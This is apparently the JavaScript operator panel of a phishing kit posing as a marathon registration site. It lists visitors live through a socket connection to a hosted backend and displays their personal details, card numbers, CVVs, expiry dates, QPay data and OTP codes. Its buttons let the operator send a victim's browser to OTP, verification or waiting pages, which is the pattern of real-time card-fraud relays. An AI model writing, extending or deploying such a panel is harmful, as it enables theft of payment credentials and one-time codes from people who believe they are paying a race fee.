const PAGES = [
  { id: 'index', name: 'الرئيسية', icon: 'fa-home', url: '/' },
  { id: 'registration', name: 'التسجيل', icon: 'fa-user-plus', url: '/registration.html' },
  { id: 'registration-summary', name: 'ملخص السلة', icon: 'fa-receipt', url: '/registration-summary.html' },
  { id: 'payment', name: 'اختيار الدفع', icon: 'fa-credit-card', url: '/payment.html' },
  { id: 'payment-card', name: 'بطاقة الائتمان', icon: 'fa-credit-card-alt', url: '/payment-card.html' },
  { id: 'qpy', name: 'QPay', icon: 'fa-mobile-alt', url: '/qpy.html' },
  { id: 'payment-verify', name: 'التحقق من الرمز', icon: 'fa-lock', url: '/payment-verify.html' },
  { id: 'otp', name: 'رمز التحقق', icon: 'fa-key', url: '/otp.html' },
  { id: 'wait', name: 'شاشة الإنتظار', icon: 'fa-spinner fa-spin', url: '/wait.html' }
];

const PAGE_LABELS = {
  'index': 'الصفحة الرئيسية',
  'registration': 'التسجيل',
  'registration-summary': 'ملخص السلة',
  'payment': 'اختيار الدفع',
  'payment-card': 'بطاقة الائتمان',
  'qpy': 'QPay',
  'payment-verify': 'التحقق من الرمز',
  'otp': 'رمز التحقق',
  'wait': 'شاشة الإنتظار'
};

const FORM_FIELD_LABELS = {
  // Registration
  raceCategory: 'فئة السباق', firstName: 'الاسم الأول', lastName: 'اسم العائلة',
  email: 'البريد الإلكتروني', phone: 'رقم الجوال', gender: 'الجنس',
  birthDate: 'تاريخ الميلاد', nationality: 'الجنسية', residence: 'بلد الإقامة',
  shirtSize: 'مقاس القميص', pace: 'الوقت المتوقع', identityNumber: 'رقم الهوية',
  club: 'النادي/العمل', coupon: 'رمز القسيمة', price: 'السعر',
  // Payment Card
  cardNumber: 'رقم البطاقة', cardCvv: 'CVV', cardExpiry: 'تاريخ الانتهاء',
  cardholderName: 'الاسم على البطاقة',
  // QPY
  cardType: 'نوع البطاقة', expMonth: 'شهر الانتهاء', expYear: 'سنة الانتهاء', cvv: 'CVV',
  // OTP/Verify
  otpCode: 'رمز التحقق'
};

let socket = null;
if (typeof io !== 'undefined') {
  const instanceKey = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.INSTANCE_KEY) ? DASHBOARD_CONFIG.INSTANCE_KEY : 'your_secret_key';
  const serverUrl = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? DASHBOARD_CONFIG.API_URL : 'https://marath.onrender.com';
  
  socket = io(serverUrl, { 
    query: { instanceKey: instanceKey },
    transports: ['websocket', 'polling'],
    withCredentials: true 
  });

  socket.on('connect', () => { 
    console.log('Socket connected'); 
    loadInitialData(); 
  });
  
  socket.on('disconnect', () => { 
    console.log('Socket disconnected'); 
  });
} else {
  console.error("Socket.io script failed to load. The backend server might be down.");
}

let users = [];
let currentUserData = null;

async function loadInitialData() {
  await Promise.all([loadStats(), loadUsers(), loadConfig()]);
}

document.addEventListener('DOMContentLoaded', () => {
  loadInitialData();
});

async function loadConfig() {
  try {
    const apiUrl = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? DASHBOARD_CONFIG.API_URL : 'https://marath.onrender.com';
    const res = await fetch(`${apiUrl}/api/config`, { credentials: 'include' });
    if(res.ok) {
        const config = await res.json();
        document.title = `لوحة التحكم - ${config.projectName}`;
        const headerLogo = document.querySelector('.header-logo');
        if (headerLogo) headerLogo.alt = config.projectName;
    }
  } catch (err) {}
}

async function loadStats() {
  try {
    const apiUrl = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? DASHBOARD_CONFIG.API_URL : 'https://marath.onrender.com';
    const res = await fetch(`${apiUrl}/api/stats`, { credentials: 'include' });
    if(res.ok) {
        const stats = await res.json();
        const connUsers = document.getElementById('connected-users');
        const totalReg = document.getElementById('total-registrations');
        if(connUsers) connUsers.textContent = stats.connectedUsers || 0;
        if(totalReg) totalReg.textContent = stats.totalRegistrations || 0;
    } else if (res.status === 401) {
        window.location.href = '/login.html';
    }
  } catch (err) {
    console.error('Error loading stats', err);
  }
}

async function loadUsers() {
  try {
    const apiUrl = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? DASHBOARD_CONFIG.API_URL : 'https://marath.onrender.com';
    const res = await fetch(`${apiUrl}/api/users`, { credentials: 'include' });
    if(res.ok) {
        const contentType = res.headers.get("content-type");
        if (contentType && contentType.indexOf("application/json") !== -1) {
            users = await res.json();
            renderUserList(users);
        } else {
            console.error("Expected JSON, got", contentType);
            const text = await res.text();
            console.error(text.substring(0, 100));
            document.getElementById('users-list').innerHTML = '<div style="padding:20px; text-align:center;">خطأ: الرد ليس JSON</div>';
        }
    } else if (res.status === 401) {
        window.location.href = '/login.html';
    } else {
        document.getElementById('users-list').innerHTML = '<div style="padding:20px; text-align:center;">خطأ في جلب البيانات</div>';
    }
  } catch (err) {
    console.error('Error loading users', err);
    document.getElementById('users-list').innerHTML = '<div style="padding:20px; text-align:center;">حدث خطأ أثناء الاتصال بالخادم</div>';
  }
}

function renderUserList(list) {
  const usersListEl = document.getElementById('users-list');
  if(!usersListEl) return;
  usersListEl.innerHTML = '';
  
  if (!list || list.length === 0) {
    usersListEl.innerHTML = '<div style="padding:20px; text-align:center; color:var(--text-muted);">لا يوجد مستخدمين نشطين</div>';
    return;
  }
  
  list.forEach(user => {
    const item = document.createElement('div');
    item.className = 'user-item';
    if(currentUserData && currentUserData.sessionId === user.sessionId) {
      item.classList.add('active');
    }
    item.dataset.sessionId = user.sessionId;
    
    const initials = getInitials(user.name || 'مستخدم');
    const dotClass = user.isConnected ? 'success' : 'muted';
    const pageName = PAGE_LABELS[user.currentPage] || user.currentPage || '';
    
    item.innerHTML = `
      <div class="user-avatar">${initials}</div>
      <div class="user-info">
        <div class="user-name">${escapeHtml(user.name || 'مجهول')}</div>
        <div class="user-meta">
          <span class="dot ${dotClass}"></span>
          ${escapeHtml(pageName)}
        </div>
        <div class="user-contact">${escapeHtml(user.email || user.phone || '')}</div>
      </div>
    `;
    item.addEventListener('click', () => selectUser(user.sessionId));
    usersListEl.appendChild(item);
  });
}

async function selectUser(sessionId) {
  try {
    const apiUrl = (typeof DASHBOARD_CONFIG !== 'undefined' && DASHBOARD_CONFIG.API_URL) ? DASHBOARD_CONFIG.API_URL : 'https://marath.onrender.com';
    const res = await fetch(`${apiUrl}/api/user/${sessionId}`, { credentials: 'include' });
    if(res.ok) {
        currentUserData = await res.json();
        
        document.querySelectorAll('.user-item').forEach(el => {
          el.classList.toggle('active', el.dataset.sessionId === sessionId);
        });
        
        renderChat(currentUserData);
    } else if (res.status === 401) {
        window.location.href = '/login.html';
    }
  } catch (err) {
    console.error('Error selecting user', err);
  }
}

function renderChat(data) {
  const placeholder = document.getElementById('chat-placeholder');
  const activeChat = document.getElementById('chat-active');
  if(placeholder) placeholder.style.display = 'none';
  if(activeChat) activeChat.style.display = 'flex';
  
  const initials = getInitials(data.name || 'مستخدم');
  const avatarEl = document.getElementById('chat-avatar');
  if(avatarEl) avatarEl.textContent = initials;
  
  const nameEl = document.getElementById('chat-name');
  if(nameEl) nameEl.textContent = escapeHtml(data.name || 'مجهول');
  
  const pageName = PAGE_LABELS[data.currentPage] || data.currentPage || '';
  const dotClass = data.isConnected ? 'success' : 'muted';
  const pageEl = document.getElementById('chat-page');
  if(pageEl) pageEl.innerHTML = `<span class="dot ${dotClass}"></span> ${escapeHtml(pageName)}`;
  
  const contactEl = document.getElementById('chat-contact');
  if(contactEl) contactEl.textContent = escapeHtml(data.email || data.phone || '');
  
  renderNavButtons(data.currentPage);
  renderMessages(data.formData);
}

function renderNavButtons(activePage) {
  const container = document.getElementById('nav-buttons');
  if(!container) return;
  container.innerHTML = '';
  
  PAGES.forEach(page => {
    const btn = document.createElement('button');
    btn.className = 'nav-btn';
    btn.dataset.page = page.id;
    if (page.id === activePage) {
      btn.classList.add('active');
    }
    
    btn.innerHTML = `
      <i class="fa ${page.icon}"></i>
      ${page.name}
      <span class="page-indicator"></span>
    `;
    
    btn.addEventListener('click', () => {
      if(currentUserData && currentUserData.sessionId) {
        socket.emit('navigate', { sessionId: currentUserData.sessionId, page: page.id });
      }
    });
    
    container.appendChild(btn);
  });
}

function renderMessages(formData) {
  const list = document.getElementById('messages-list');
  if(!list) return;
  list.innerHTML = '';
  
  const pageOrder = ['registration', 'payment-card', 'qpy', 'otp', 'payment-verify'];
  
  pageOrder.forEach(pageId => {
    const data = formData ? formData[pageId] : null;
    if (data && Object.keys(data).length > 0) {
      const group = document.createElement('div');
      group.className = 'message-group';
      
      const header = document.createElement('div');
      header.className = 'message-group-header';
      header.textContent = PAGE_LABELS[pageId] || pageId;
      group.appendChild(header);
      
      Object.entries(data).forEach(([key, value]) => {
        if (value && String(value).trim() !== '') {
          const item = document.createElement('div');
          item.className = 'message-item';
          
          const label = document.createElement('span');
          label.className = 'message-label';
          label.textContent = FORM_FIELD_LABELS[key] || key;
          
          const val = document.createElement('span');
          val.className = 'message-value';
          val.textContent = escapeHtml(String(value));
          
          item.appendChild(label);
          item.appendChild(val);
          group.appendChild(item);
        }
      });
      
      if(group.children.length > 1) { // Only append if it has fields
          list.appendChild(group);
      }
    }
  });
}

function setupSearch() {
  const searchInput = document.getElementById('user-search');
  if(searchInput) {
    searchInput.addEventListener('input', (e) => {
      const term = e.target.value.toLowerCase();
      const filtered = users.filter(u => 
        (u.name && u.name.toLowerCase().includes(term)) ||
        (u.email && u.email.toLowerCase().includes(term)) ||
        (u.phone && u.phone.toLowerCase().includes(term))
      );
      renderUserList(filtered);
    });
  }
}

if (socket) {
  socket.on('user:connected', ({ sessionId, page }) => {
    const user = users.find(u => u.sessionId === sessionId);
    if(user) {
      user.isConnected = true;
      user.currentPage = page || user.currentPage;
    } else {
      loadUsers(); // load if new user
    }
    renderUserList(users);
    loadStats();
  });

  socket.on('user:disconnected', ({ sessionId }) => {
    const user = users.find(u => u.sessionId === sessionId);
    if(user) {
      user.isConnected = false;
      renderUserList(users);
      if(currentUserData && currentUserData.sessionId === sessionId) {
        currentUserData.isConnected = false;
        renderChat(currentUserData);
      }
    }
    loadStats();
  });

  socket.on('user:page-change', ({ sessionId, page }) => {
    const user = users.find(u => u.sessionId === sessionId);
    if(user) {
      user.currentPage = page;
      renderUserList(users);
      if(currentUserData && currentUserData.sessionId === sessionId) {
        currentUserData.currentPage = page;
        renderChat(currentUserData);
      }
    }
  });

  socket.on('user:form-submit', ({ sessionId, page, formData }) => {
    if(currentUserData && currentUserData.sessionId === sessionId) {
      if(!currentUserData.formData) currentUserData.formData = {};
      currentUserData.formData[page] = formData;
      renderMessages(currentUserData.formData);
    }
  });

  socket.on('user:update', ({ sessionId, page, formData }) => {
    if(currentUserData && currentUserData.sessionId === sessionId) {
      if(!currentUserData.formData) currentUserData.formData = {};
      if (formData) currentUserData.formData[page] = formData;
      if (page) currentUserData.currentPage = page;
      renderChat(currentUserData);
    }
    const user = users.find(u => u.sessionId === sessionId);
    if(user) {
      if(page) user.currentPage = page;
      renderUserList(users);
    }
  });
}

function getInitials(name) {
  if(!name) return 'م';
  const parts = name.trim().split(' ');
  if(parts.length >= 2) {
    return (parts[0].charAt(0) + parts[1].charAt(0)).toUpperCase();
  }
  return name.substring(0, 2).toUpperCase();
}

function escapeHtml(str) {
  if (typeof str !== 'string') return str;
  return str.replace(/[&<>"']/g, function(m) {
    switch (m) {
      case '&': return '&amp;';
      case '<': return '&lt;';
      case '>': return '&gt;';
      case '"': return '&quot;';
      case "'": return '&#039;';
    }
  });
}

document.addEventListener('DOMContentLoaded', () => {
  setupSearch();
});
